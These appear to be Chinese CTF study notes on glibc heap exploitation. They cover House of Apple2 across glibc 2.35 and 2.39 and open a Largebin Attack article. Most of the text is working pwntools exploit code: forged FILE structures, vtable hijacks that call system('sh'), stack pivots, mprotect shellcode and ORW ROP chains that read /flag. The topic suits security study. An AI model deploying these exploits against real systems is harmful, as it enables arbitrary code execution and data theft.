rax+0x68这个地址里面的值\n也就是我们需要将system的地址写入上面这个rax+0x68这个地方(这里其实就是__doallocate)\n我们将rax+0xe8(28)这个地方写入一个地址就写heap2的头地址，然后heap2+0x68(13)写system的地址就可以\n3.为什么要把sh；写在heap1的pre_size位，以及为什么是sh；\n这里关键就是要找rdi的赋值\n\n我们可以看到r15的值是rip+0x18cd1e这个地方的值\n而这个值就是_IO_list_all这个地址中的值，这个地址中本来放的是stderr，我们通过largebinattack改成了heap1的头地址\nedit(0,p64(0)*3+p64(listall-0x20))add(4,0x500)\n\nr15 &#x3D; heap1的头地址\n\nrdi &#x3D; heap1的头地址\n往heap1的头地址写入&#x2F;bin&#x2F;sh（其实就是pre_size &#x3D; &#x2F;bin&#x2F;sh），rdi就为&#x2F;bin&#x2F;sh的地址\n但是其值不满足flags的条件所以改为空格sh;\nadd(0,0x450)add(1,0x428) #末尾为0x8可以改下一个的pre_size位add(2,0x440)edit(1,b&#x27;a&#x27;*0x420+b&#x27; sh;&#x27;)#fake_io = p64(0) #flags #fake_io += p64(0)#IO read ptrfake_io = p64(0)#IO read endfake_io += p64(0)#I0 read basefake_io += p64(0)#IO write basefake_io += p64(1)#IO write ptrfake_io += p64(0)#IO write endfake_io += p64(0)#IO buf basefake_io += p64(0)#IO buf endfake_io += p64(0)#_IO_save_basefake_io += p64(0)#_IO_backup_basefake_io += p64(0)#_IO_save_endfake_io += p64(0)#_markersfake_io += p64(0)#chainfake_io += p64(0)fake_io += p64(0xffffffffffffffff)#old_offsetfake_io += p64(0)fake_io += p64(addr1)fake_io += p64(0)*2fake_io += p64(addr2)#_wide_datafake_io += p64(0)*6fake_io += p64(_IO_wfile_jumps)#vtableedit(0,p64(0)*11+p64(system)+p64(0)*14+p64(addr2))from pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;node2.anna.nssctf.cn&#x27;,28168)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def add(idx,size):    p.recvuntil(&#x27;choice:&#x27;)    p.send(b&#x27;1&#x27;)    p.recvuntil(b&#x27;index:&#x27;)    p.send(str(idx))    p.recvuntil(&#x27;size:&#x27;)    p.send(str(size))def free(idx):    p.recvuntil(&#x27;choice:&#x27;)    p.send(b&#x27;2&#x27;)    p.recvuntil(b&#x27;index:&#x27;)    p.send(str(idx))def show(idx):    p.recvuntil(&#x27;choice:&#x27;)    p.send(b&#x27;4&#x27;)    p.recvuntil(b&#x27;index:&#x27;)    p.send(str(idx))def edit(idx,content):    p.recvuntil(&#x27;choice:&#x27;)    p.send(b&#x27;3&#x27;)    p.recvuntil(b&#x27;index:&#x27;)    p.send(str(idx))    p.recvuntil(&#x27;content:&#x27;)    p.send(content)def bug():    gdb.attach(p)add(0,0x450)add(1,0x428)add(2,0x440)edit(1,b&#x27;a&#x27;*0x420+b&#x27; sh;&#x27;)free(0)        add(3,0x500)free(2)show(0)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x21b0e0print(hex(libc_base))edit(0,b&#x27;a&#x27;*15+b&#x27;b&#x27;)show(0)p.recvuntil(b&#x27;ab&#x27;)addr2 = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) #0addr1 = addr2+0x890 #2_IO_wfile_jumps = libc_base+libc.sym[&#x27;_IO_wfile_jumps&#x27;]listall = libc_base + libc.sym[&#x27;_IO_list_all&#x27;]system = libc_base +libc.sym[&#x27;system&#x27;]log.success(&quot; listall --&gt; &quot;+hex(listall))ogg = libc_base +0xebc81 #0xebc85 0xebc88 0xebc88 0xebd38 0xebd3f 0xebd43#bug()edit(0,p64(0)*3+p64(listall-0x20))add(4,0x500)#bug()#fake_io = p64(0) #flags #fake_io += p64(0)#IO read ptrfake_io = p64(0)#IO read endfake_io += p64(0)#I0 read basefake_io += p64(0)#IO write basefake_io += p64(1)#IO write ptrfake_io += p64(0)#IO write endfake_io += p64(0)#IO buf basefake_io += p64(0)#IO buf endfake_io += p64(0)#_IO_save_basefake_io += p64(0)#_IO_backup_basefake_io += p64(0)#_IO_save_endfake_io += p64(0)#_markersfake_io += p64(0)#chainfake_io += p64(0)fake_io += p64(0xffffffffffffffff)#old_offsetfake_io += p64(0)fake_io += p64(addr1)fake_io += p64(0)*2fake_io += p64(addr2)#_wide_datafake_io += p64(0)*6fake_io += p64(_IO_wfile_jumps)#vtableedit(2,fake_io)fake_jump = b&#x27;a&#x27;*88+p64(ogg)edit(0,p64(0)*11+p64(system)+p64(0)*14+p64(addr2))bug()p.sendline(b&#x27;5&#x27;)p.interactive()\n\n p *(struct _IO_FILE_plus *)\n\n\n还可以这样构造将wide_date 写heap1的头偏移0xe0(28)的地方写system 所在地址-0x68也就是heap1+0x80的地址\n这样只需要一个堆块就可以\n#fake_io = p64(0) #flags #fake_io += p64(0)#IO read ptrfake_io = p64(0)#IO read endfake_io += p64(0)#I0 read basefake_io += p64(0)#IO write basefake_io += p64(1)#IO write ptrfake_io += p64(0)#IO write endfake_io += p64(0)#IO buf basefake_io += p64(0)#IO buf endfake_io += p64(0)#_IO_save_basefake_io += p64(0)#_IO_backup_basefake_io += p64(0)#_IO_save_endfake_io += p64(0)#_markersfake_io += p64(0)#chainfake_io += p64(0)fake_io += p64(0xffffffffffffffff)#old_offsetfake_io += p64(0)fake_io += p64(0)#_lock fake_io += p64(0)*2fake_io += p64(addr1)#_wide_datafake_io += p64(0)*6fake_io += p64(_IO_wfile_jumps)#vtablefake_io += p64(addr1+0x80) #28  #_wide_vtablefake_io += p64(system)          #__doallocate\n\n总结：结合前面的理解offset &#x3D; 0xe0这个位置就是wide_data的vtable \np *(struct _IO_wide_data *)\n$4 = &#123;  _IO_read_ptr = 0x3b687320 &lt;error: Cannot access memory at address 0x3b687320&gt;,  _IO_read_end = 0x451 &lt;error: Cannot access memory at address 0x451&gt;,  _IO_read_base = 0x0,  _IO_write_base = 0x0,  _IO_write_ptr = 0x0,  _IO_write_end = 0x1 &lt;error: Cannot access memory at address 0x1&gt;,  _IO_buf_base = 0x0,  _IO_buf_end = 0x0,  _IO_save_base = 0x0,  _IO_backup_base = 0x5555555592b0 L&quot;&quot;,  _IO_save_end = 0x0,  _IO_state = &#123;    __count = 0,    __value = &#123;      __wch = 0,      __wchb = &quot;\\000\\000\\000&quot;    &#125;  &#125;,  _IO_last_state = &#123;    __count = 0,    __value = &#123;      __wch = 0,      __wchb = &quot;\\000\\000\\000&quot;    &#125;  &#125;,  _codecvt = &#123;    __cd_in = &#123;      step = 0x0,      step_data = &#123;        __outbuf = 0x0,        __outbufend = 0xffffffffffffffff &lt;error: Cannot access memory at address 0xffffffffffffffff&gt;,        __flags = 0,        __invocation_counter = 0,        __internal_use = 0,        __statep = 0x0,        __state = &#123;          __count = 0,          __value = &#123;            __wch = 0,            __wchb = &quot;\\000\\000\\000&quot;          &#125;        &#125;      &#125;    &#125;,    __cd_out = &#123;      step = 0x555555559b20,      step_data = &#123;        __outbuf = 0x0,        __outbufend = 0x0,        __flags = 0,        __invocation_counter = 0,        __internal_use = 0,        __statep = 0x0,        __state = &#123;          __count = 0,          __value = &#123;            __wch = 0,            __wchb = &quot;\\000\\000\\000&quot;          &#125;        &#125;      &#125;    &#125;  &#125;,  _shortbuf = L&quot;\\xf7e170c0&quot;,  _wide_vtable = 0x555555559ba0&#125;\n\nvtable偏移0xe8就是__doallocate  这里放system就会调用\np *(struct _IO_jump_t *)\n\n（2）2.35 House of Apple2（orw）实现orw就是要栈迁移，因为需要pop，需要讲rsp迁到正确的地方\n\n\np svcudp_replyx/16i 0x7ffff7d6a050\n\n主要靠的就是这一段代码\n从上面我们知道rdi就是heap1的头地址\nrdi+0x48 就是 _IO_save_base\n我们在_IO_save_base写什么 rbp就等于什么\nrax &#x3D; [rbp+0x18] \n我们需要在rbp+0x18的地方写一个地址作为rax\n然后会call [rax+0x28] \n因为前面要写orw，所以rax的值要大一些（heap2+0x200），为了避免orw的代码覆盖到rax+0x28\n1.那么rax+0x28的地方写什么呢写leave_ret，我们控制了rbp，经过leave_ret,rsp &#x3D; rbp+8,我们讲orw的代码布置在rbp+8的地方就可以\n然后rbp+0x18的位置是rax的值，这个我们是不能变得，而且rbp+0x10的位置会被清零\n（mov    dword ptr [rbp + 0x10], 0）\n所以我们需要在rbp+0x8的地方写两个pop 将这两个废值pop 走\n然后后面接pop 接orw就可以\n2._IO_save_base（rbp）该为多少如果我们写heap2的地址，那么rbp+0x8的地方为size位，我们控制不了\n所以写heap2+0x10，这样rbp+0x8，就是数据的第二个位置，第一个位置写&#x2F;flag\\x00\\x00，第二个位置写两个pop\n\n\n\n\nmagic = libc_base+0x16a06a#fake_io = p64(0) #flags #fake_io += p64(0)#IO read ptrfake_io = p64(0)#IO read endfake_io += p64(0)#I0 read basefake_io += p64(0)#IO write basefake_io += p64(1)#IO write ptrfake_io += p64(0)#IO write endfake_io += p64(0)#IO buf basefake_io += p64(0)#IO buf endfake_io += p64(addr2+0x10)#_IO_save_basefake_io += p64(0)#_IO_backup_basefake_io += p64(0)#_IO_save_endfake_io += p64(0)#_markersfake_io += p64(0)#chainfake_io += p64(0)fake_io += p64(0xffffffffffffffff)#old_offsetfake_io += p64(0)fake_io += p64(0)#_lock fake_io += p64(0)*2fake_io += p64(addr1)#_wide_datafake_io += p64(0)*6fake_io += p64(_IO_wfile_jumps)#vtablefake_io += p64(addr1+0x80) #28fake_io += p64(magic) \n\n最短leave_ret紧紧贴着0x30\norw = p64(rdi)+p64(addr2+0x10)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(openn)orw+=p64(rdi)+p64(3)+p64(rsi)+p64(addr2+0x300)+p64(rdx)+p64(0x30)*2+p64(readd)orw+=p64(rdi)+p64(1)+p64(rsi)+p64(addr2+0x300)+p64(rdx)+p64(0x30)*2+p64(writee)+p64(leave_ret)edit(0,b&#x27;/flag\\x00\\x00\\x00&#x27;+p64(r12)+p64(0)+p64(addr2+0xc8)+orw)leave_ret = pie +0x01412print(hex(leave_ret))r12 = libc_base+0x011b768openn=libc_base+libc.sym[&#x27;open&#x27;]readd=libc_base+libc.sym[&#x27;read&#x27;]writee=libc_base+libc.sym[&#x27;write&#x27;]rdi=libc_base+0x002a3e5rsi=libc_base+0x02be51rdx=libc_base+0x11f2e7rax = libc_base +0x45eb0syscall = libc_base+0x029db4orw = p64(rdi)+p64(addr2+0x10)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(openn)orw+=p64(rdi)+p64(3)+p64(rsi)+p64(addr2+0x300)+p64(rdx)+p64(0x30)*2+p64(readd)orw+=p64(rdi)+p64(1)+p64(rsi)+p64(addr2+0x300)+p64(rdx)+p64(0x30)*2+p64(writee)edit(0,b&#x27;/flag\\x00\\x00\\x00&#x27;+p64(r12)+p64(addr2+0x200)*2+orw.ljust(0x1f8,b&#x27;\\x00&#x27;)+p64(leave_ret))\n\n（3）2.35 House of Apple2（puts）puts 原本调用链 \n_IO_file_xsputn –&gt; _IO_file_overflow  –&gt; _IO_do_write  –&gt; _IO_file_write  –&gt; write\n_IO_file_xsputn在虚表偏移0x38的位置\n\n而_IO_file_overflow在虚表偏移0x18的位置\n\n那么我们将虚表往前改0x20，那么puts调用_IO_file_xsputn调用偏移0x38的地方就会是_IO_file_overflow\n就和exit一样了\n\n但是进入puts，我们发现他并不是从_IO_list_all 中找stdout的结构体，这个结构体是在bss段上的，所以我们要将bss段上的结构体改了\n而exit走的是_IO_list_all\n\n问题：用largebin attack改bss段上他那个stdout的地址为堆块的地址，先用largebin attack，那个现在在unsortbin，要放的largebin的堆块是free的里面是空的，我改完调用puts就报错了，我要是先伪造好io结构体，然后挂进largebin他就会报错，然后我就给他那个fd和bk写了一下，他不报错了，但是那个_IO_read_end不是0了，不满足掉用条件了\n\n那么如何满足条件呢？\n答案就是再来一个堆块伪造_wide_data这个结构体\n应为调用_IO_wfile_jumps看的是_wide_data这个结构体\n原本是将stdout与_wide_data伪造在一个地方，他们的数据是共用的，所以_IO_read_end不为0\n但是我们再来一个堆块就可以了\n我们需要先改完结构体在挂进链表，所以fd与bk要写好\n#stdout = p64(0) #flags #stdout += p64(0)#IO read ptrstdout = p64(0x7ffff7e1ace0)#IO read endstdout += p64(0x7ffff7e1ace0)#I0 read basestdout += p64(0)#IO write basestdout += p64(1)#IO write ptrstdout += p64(0)#IO write endstdout += p64(0)#IO buf basestdout += p64(0)#IO buf endstdout += p64(0)#_IO_save_basestdout += p64(0)#_IO_backup_basestdout += p64(0)#_IO_save_endstdout += p64(0)#_markersstdout += p64(0)#chainstdout += p64(0)stdout += p64(0xffffffffffffffff)#old_offsetstdout += p64(0)stdout += p64(addr2+0x30)#_lock stdout += p64(0)*2stdout += p64(addr1)#_wide_datastdout += p64(0)*6stdout += p64(_IO_wfile_jumps-0x20)#vtableedit(2,stdout)\n\n需要注意的是*_lock_addr &#x3D; 0\n#wide_data = p64(0) #flags #wide_data += p64(0)#IO read ptrwide_data = p64(0)#IO read endwide_data += p64(0)#I0 read basewide_data += p64(0)#IO write basewide_data += p64(0)#IO write ptrwide_data += p64(0)#IO write endwide_data += p64(0)#IO buf basewide_data += p64(0)#IO buf endwide_data += p64(addr2+0x10)#_IO_save_basewide_data += p64(0)#_IO_backup_basewide_data += p64(0)#_IO_save_endwide_data += p64(0)#_markerswide_data += p64(addr1)#chainwide_data += p64(0)wide_data += p64(0xffffffffffffffff)#old_offsetwide_data += p64(0)wide_data += p64(0)#_lock wide_data += p64(0)*2wide_data += p64(0)#_wide_datawide_data += p64(0)*7wide_data += p64(addr1+0x80) #28wide_data += p64(system) \n\nstdout +&#x3D; p64(_IO_wfile_jumps-0x20)#vtable\n这里其实也不用变\n_IO_wfile_xsputn–&gt;_IO_wdefault_xsputn–&gt;_IO_wdoallocbuf–&gt;setcontext+61\n（4）2.39 House of Apple2（system）exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all-&gt;_IO_wfile_overflow-&gt;_IO_wdoallocbuf\n与2.35区别\n1.largebin 检查完善，挂入链表时候，也就是largebin attack时候要给fd bk fdnextsize改回去\n2.中间有一些操作导致结构体中数据被改，要绕开这些地址，防止结构体被改\n\n0x55555555bb60就是lock\n他会对其赋值，所以不要让他改到\n_wide_data-&gt;_IO_write_base\n_wide_data-&gt;_IO_buf_base\n#fake_io = p64(0) #flags #fake_io += p64(0)#IO read ptrfake_io = p64(0)#IO read endfake_io += p64(0)#I0 read basefake_io += p64(0)#IO write basefake_io += p64(1)#IO write ptrfake_io += p64(0)#IO write endfake_io += p64(0)#IO buf basefake_io += p64(0)#IO buf endfake_io += p64(0)#_IO_save_basefake_io += p64(0)#_IO_backup_basefake_io += p64(0)#_IO_save_endfake_io += p64(0)#_markersfake_io += p64(0)#chainfake_io += p64(0)fake_io += p64(0xffffffffffffffff)#old_offsetfake_io += p64(0)fake_io += p64(addr1+0x40)#_lock fake_io += p64(0)*2fake_io += p64(addr1)#_wide_datafake_io += p64(0)*6fake_io += p64(_IO_wfile_jumps)#vtablefake_io += p64(addr1+0x80) #28fake_io += p64(system) \n\n（5）2.39 House of Apple2（puts）与2.35区别\n1.largebin 检查完善，挂入链表时候，也就是largebin attack时候要给fd bk fdnextsize改回去，并且unsortbin的fd与bk与2.35不通记得改\n2.中间有一些操作导致结构体中数据被改，要绕开这些地址，防止结构体被改，这个不用担心，因为wide_data段是另一个堆块不会被影响\n#stdout = p64(0) #flags #stdout += p64(0)#IO read ptrstdout = p64(0x7ffff7e03b20)#IO read endstdout += p64(0x7ffff7e03b20)#I0 read basestdout += p64(0)#IO write basestdout += p64(0)#IO write ptrstdout += p64(0)#IO write endstdout += p64(0)#IO buf basestdout += p64(0)#IO buf endstdout += p64(0)#_IO_save_basestdout += p64(0)#_IO_backup_basestdout += p64(0)#_IO_save_endstdout += p64(0)#_markersstdout += p64(0)#chainstdout += p64(0)stdout += p64(0xffffffffffffffff)#old_offsetstdout += p64(0)stdout += p64(addr2+0x30)#_lock stdout += p64(0)*2stdout += p64(addr1)#_wide_datastdout += p64(0)*6stdout += p64(_IO_wfile_jumps-0x20)#vtableedit(2,stdout)#wide_data = p64(0) #flags #wide_data += p64(0)#IO read ptrwide_data = p64(0)#IO read endwide_data += p64(0)#I0 read basewide_data += p64(0)#IO write basewide_data += p64(1)#IO write ptrwide_data += p64(0)#IO write endwide_data += p64(0)#IO buf basewide_data += p64(0)#IO buf endwide_data += p64(addr2+0x10)#_IO_save_basewide_data += p64(0)#_IO_backup_basewide_data += p64(0)#_IO_save_endwide_data += p64(0)#_markerswide_data += p64(addr1)#chainwide_data += p64(0)wide_data += p64(0xffffffffffffffff)#old_offsetwide_data += p64(0)wide_data += p64(0)#_lock wide_data += p64(0)*2wide_data += p64(0)#_wide_datawide_data += p64(0)*7wide_data += p64(addr1+0x80) #28wide_data += p64(system) edit(1,wide_data)\n\n（6）2.39 House of Apple2（orw）1.shellcode这个片段可以控制rsp，并且后面有return，那我们把攻击代码写在rsp的地方就可以执行，但是不能写orw了，因为没有pop rdx，所以调用mprotect，获取shell写shellcode\n我们可以发现所有寄存器的值都是由r12控制的但是r12的值错误，我们要找到一个可以控制r12，且有call的\nsvcudp_reply = libc_base+0x179220+29swapcontext = libc_base+0x5814d\n\n\n\n在2.39svcudp_reply+26刚好可以满足，原本2.35下svcudp_reply+26可以直接用rdi控制rbp，再接leave ret就可以控制rsp了\nrax就是largebin attack的头\n\n注：这里我们要控制rsp的值，与rcx的值，因为push rax后rsp &#x3D; rax，并且push的时候rsp的值要有地址\n我们将rcx &#x3D; mprotect参数设置好，后面就会调用成功，并且后面还有个ret 这时候就会执行rsp的内容，我们将orw写在这里就好\nrsp &#x3D; &amp;addr\nadd &#x3D; &amp;orw\n第一个\n第二个\n\n#fake_io = p64(0) #flags #fake_io += p64(0)#IO read ptrfake_io = p64(0)#IO read endfake_io += p64(0)#I0 read basefake_io += p64(0)#IO write basefake_io += p64(1)#IO write ptrfake_io += p64(0)#IO write endfake_io += p64(0)#IO buf basefake_io += p64(0)#IO buf endfake_io += p64(addr1+0x10)#_IO_save_base   r12fake_io += p64(0)#_IO_backup_basefake_io += p64(0)#_IO_save_endfake_io += p64(0)#_markersfake_io += p64(0)#chainfake_io += p64(0)fake_io += p64(0xffffffffffffffff)#old_offsetfake_io += p64(0)fake_io += p64(0x7ffff7e05700)#_lock fake_io += p64(0)fake_io += p64(0)fake_io += p64(addr2)#_wide_datafake_io += p64(0)*6fake_io += p64(_IO_wfile_jumps)#vtablefake_io += p64(addr2+0x80) #28fake_io += p64(svcudp_reply)  edit(2,fake_io)payload = b&#x27;a&#x27;*0x18+p64(addr1+0x10)+p64(addr0+0x10)+p64(swapcontext) addr1 = payloadpayload = payload.ljust(0x68,b&#x27;a&#x27;)+p64(addr1-0x6f0)+p64(0x3000)+p64(addr1+0x500)  #rdi rsi rsp = flag&#123;......&#125;payload = payload.ljust(0x88,b&#x27;a&#x27;)+p64(7)  #rdxpayload = payload.ljust(0xa0,b&#x27;a&#x27;)+p64(addr1+0xf8)+p64(mprotect) #rsp=&amp;orw-8 rcxpayload = payload.ljust(0xe0,b&#x27;a&#x27;)+p64(addr1) #pre rcx 有个地址就行orw = asm(&#x27;&#x27;&#x27;    mov rdi, 0x67616c662f    push rdi    mov rdi, rsp    mov rax, 2    xor rsi, rsi    syscall    mov rdi,rax    mov rsi, rbp    mov rdx, 0x100    xor rax, rax    syscall    mov rdi, 1    mov rdx, rax    mov rax, 1    syscall    xor rax, rax    add rax, 60    syscall&#x27;&#x27;&#x27;)edit(1,payload+p64(addr1+0x100)+orw)  #orw addr\n\n为什么rsp&#x3D;&amp;orw-8\n因为ret &#x3D; addr1+0x100，这样就会执行到orw但是rsp也要跟上，ret后rsp+8就等于&amp;orw\n2.ROP putsorw = p64(pop_rsi) + p64(flag)*6+ p64(pop_rdi) +p64(0xffffffffffffffff)+ p64(open_addr)   #*rdx+0xe0=rcx = addrorw += p64(pop_rdi) + p64(3)+p64(pop_rsi) + p64(flag_addr) +p64(pop_rdx)+p64(0x100)+p64(0)*4+p64(read_addr)orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(write_addr)+b&#x27;/flag\\x00\\x00\\x00&#x27;payload = b&#x27;a&#x27;*0x18+p64(addr1)+p64(addr1+0x10)+p64(magic2)  #addr1 = &amp;payload =rax rsp payload = payload.ljust(0x68,b&#x27;a&#x27;)+p64(libc_base)+p64(0x100000) #rdi rsi payload = payload.ljust(0x88,b&#x27;a&#x27;)+p64(0)  #rdxpayload = payload.ljust(0xa0,b&#x27;a&#x27;)+p64(_IO_2_1_stderr_addr-0x8)+orw #rsp=&amp;pop_rdi-0x8 rcx=orw \n\nflag &#x3D; &#x2F;flag\\x00\\x00\\x00 这里为什么写这么多flag，因为rdx+0xe0&#x3D;rcx &#x3D; addr，rcx的值要是一个地址\n为什么rsp&#x3D;&amp;pop_rdi-0x8\n因为ret后rsp+8，写&amp;pop_rdi-0x8，这样执行完pop_rsp,以及ret后，就会接着执行pop rdi\nfake_io = p64(0) #flags fake_io += p64(0x7ffff7e04643)#IO read ptrfake_io = p64(0x7ffff7e04643)#IO read endfake_io += p64(0)#I0 read basefake_io += p64(0)#IO write basefake_io += p64(1)#IO write ptrfake_io += p64(0)#IO write endfake_io += p64(0)#IO buf basefake_io += p64(0)#IO buf endfake_io += p64(addr1)#_IO_save_basefake_io += p64(0)#_IO_backup_basefake_io += p64(0)#_IO_save_endfake_io += p64(0)#_markersfake_io += p64(0)#chainfake_io += p64(0)fake_io += p64(0xffffffffffffffff)#old_offsetfake_io += p64(0)fake_io += p64(0x7ffff7e045c0)#_lock fake_io += p64(0)*2fake_io += p64(_IO_2_1_stdout_addr)#_wide_data &amp;flagsfake_io += p64(0)*6fake_io += p64(_IO_wfile_jumps-0x20)#vtablefake_io += p64(_IO_2_1_stdout_addr+0x80) #28fake_io += p64(magic)  #magic = svcudp_reply+29\n\n（7）printffake_file=flat(&#123;0x0: p64(addr1+0x10), #&amp;orw0x8: &quot;/flag\\0&quot;,0x10: p64(libc_base+libc.symbols[&#x27;setcontext&#x27;] +61),#_wide_vtable+0x18 也就是这里__overflow0x20: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]), #_IO_write_base0x88: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock0xa0: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]),#rsp _wide_data0xa8: p64(pop_rsp),0xd8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;] +0x10),0xe0: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]-8), #_wide_vtable&#125;, filler=b&quot;\\x00&quot;)_vfprintf_internal-&gt;__printf_buffer_to_file_done-&gt;_IO_wfile_seekoff/*(fp-&gt;vtable+0x38)(fp) #_IO_wfile_jumps+0x10-&gt;_IO_switch_to_wget_mode-&gt;(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18) \n\n在_IO_wfile_seekoff中，还有一些条件需要满足，首先rcx寄存器需要不为0，_IO_wfile_seekoff要求rcx不为 0，并非 “寄存器本身不能为 0”，而是通过**rcx**传递的**mode**参数必须是 “合法的非 0 值”—— 因为mode是函数判断 “操作合法性”“缓冲区同步逻辑” 的前提，若mode=0，函数失去核心判断依据，无法安全、正确地执行 “宽字符文件偏移” 操作。\n总结一下所有的调用链p *(struct _IO_FILE_plus *)p *(struct _IO_wide_data *)p *(struct _IO_jump_t *)\n\nexit调用io虚表的偏移是0x18\n__run_exit_handlers--&gt;&gt;_IO_cleanup #_IO_flush_all_lockp--&gt;&gt;*(fp-&gt;vtable+0x18)(fp) #_IO_wfile_overflow\n\nprintf 调用io虚表偏移0x38\n_vfprintf_internal--&gt;&gt;__printf_buffer_to_file_done--&gt;&gt;*(fp-&gt;vtable+0x38)(fp)  #_IO_wfile_xsputn\n\nputs也是调用io虚表偏移0x38\n_vfprintf_internal--&gt;&gt;__printf_buffer_to_file_done--&gt;&gt;*(fp-&gt;vtable+0x38)(fp)  #_IO_wfile_xsputn\n\n我们打io不管他是调用偏移多少的，我们通过改的偏移让他调用_IO_wfile_overflow\n_IO_wfile_jumps:   puts和printf我们都将虚表改成_IO_wfile_jumps-0x20\n_IO_wfile_seekoff: puts和printf我们都将虚表改成_IO_wfile_jumps+0x10 \n​                                                exit我们将虚表改成_IO_wfile_jumps-0x10\n_IO_wfile_overflow--&gt;&gt;_IO_wdoallocbuf    --&gt;&gt;_IO_WDOALLOCATE        --&gt;&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)/            *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;_doallocate)(fp)-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)  *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__overflow)(fp)fake_io = flat(&#123;    #0x0: /bin/sh\\x00 这个用上一个堆块0x8结尾改pre_size    #0x8: p64(0),    0x8: p64(1),,    0x58: p64(0xffffffffffffffff),    0x78: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock    0x80: p64(addr1),    0xb8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;]),    0xc0: p64(addr1 + 0x80),    0xc8: p64(system)&#125;, filler=b&#x27;\\x00&#x27;)fake_file=flat(&#123;#0x0: p64(addr1+0x10), #&amp;orw 这个用上一个堆块0x8结尾改pre_size#0x8: &quot;/flag\\0&quot;,0x00: p64(libc_base+libc.symbols[&#x27;setcontext&#x27;] +61),#_wide_vtable+0x180x10: p64(addr1+0x10), #_IO_write_base rdx0x78: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock0x90: p64(addr1),#rsp _wide_data0x98: p64(pop_rsp),0xc8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;] +0x10),0xd0: p64(addr1+8), #_wide_vtable&#125;, filler=b&quot;\\x00&quot;)orw = p64(pop_rsi) + p64(0)+ p64(pop_rdi)+p64(flag)+p64(pop_rdx)+p64(0)+p64(0)*4+p64(open_addr)   #*rdx+0xe0 = addrorw += p64(pop_rdi) + p64(3)+p64(pop_rsi) + p64(flag_addr) +p64(pop_rdx)+p64(0x100)+p64(0)*4+p64(read_addr)orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(write_addr)+b&quot;/flag\\x00\\x00\\x00&quot;  \n","categories":["堆"],"tags":["知识点"]},{"title":"Largebin Attack","url":"/2025/11/18/Largebin-Attack/","content":"\n原理：Large Bin结构large bin中一共包括63个bin，每个bin中的chunk大小不一致，而是出于一定区间范围内。此外这63个bin被分成了6组，每组bin中的chunk之间的公差一致\n按范围递增（范围随 index 扩大）：- index 0~3：0x400~0x800 字节- index 4~59：0x800~ 几 KB- index 60~62：几 MB 至更大\n大于512（1024）字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的\n被释放进Large Bin中的chunk，除了以前经常见到的prev_size、size、fd、bk之外，还具有fd_nextsize和bk_nextsize:\nfd_nextsize，bk_nextsize：只有chunk可先的时候才使用，不过用于较大的chunk（large chunk）\nfd_nextsize指向下一个与当前chunk大小不同的（小的）第一个空闲块，不包含bin的头指针\nbk_nextsize指向上一个与当前chunk大小不同的（大的）第一个空闲块，不包含bin的头指针\n这里下一个上一个相较于链表头部，链表头部往下堆块的地址变小\n\nfd_nextsize 方向 → size 递减\nbk_nextsize 方向 → size 递增\n\n一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适chunk时挨个遍历\nLarge Bin的插入顺序在index相同的情况下：\n1、按照大小，从大到小排序（小的链接large bin块）\n2、如果大小相同，按照free的时间排序\n3、多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0\n4、size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk\n我们从链表头部开始遍历，直到找到第一个 size 大于等于待插入 chunk 的链表，找到后判断链表的 size 是否等于待插入chunk的size，如果相等，直接将这个 chunk 插入到当前链表的第二个位置，如果不相等，说明待插入的chunk比当前链表头结点的 size 大，那么我们将待插入的chunk作为当前链表的头结点，插入到符合size的bin index后\n\n例：how2heap 1 // gcc -g -no-pie hollk.c -o hollk 2 #include &lt;stdio.h&gt; 3 #include &lt;stdlib.h&gt; 4  5 int main() 6 &#123; 7  8     unsigned long stack_var1 = 0; 9     unsigned long stack_var2 = 0;10 11     fprintf(stderr, &quot;stack_var1 (%p): %ld\\n&quot;, &amp;stack_var1, stack_var1);12     fprintf(stderr, &quot;stack_var2 (%p): %ld\\n\\n&quot;, &amp;stack_var2, stack_var2);13 14     unsigned long *p1 = malloc(0x320);15     malloc(0x20);16     unsigned long *p2 = malloc(0x400);17     malloc(0x20);18     unsigned long *p3 = malloc(0x400);19     malloc(0x20);20 21     free(p1);22     free(p2);23 24     void* p4 = malloc(0x90);25 26     free(p3);27 28     p2[-1] = 0x3f1;29     p2[0] = 0;30     p2[2] = 0;31     p2[1] = (unsigned long)(&amp;stack_var1 - 2);32     p2[3] = (unsigned long)(&amp;stack_var2 - 4);33 34     malloc(0x90);35 36     fprintf(stderr, &quot;stack_var1 (%p): %p\\n&quot;, &amp;stack_var1, (void *)stack_var1);37     fprintf(stderr, 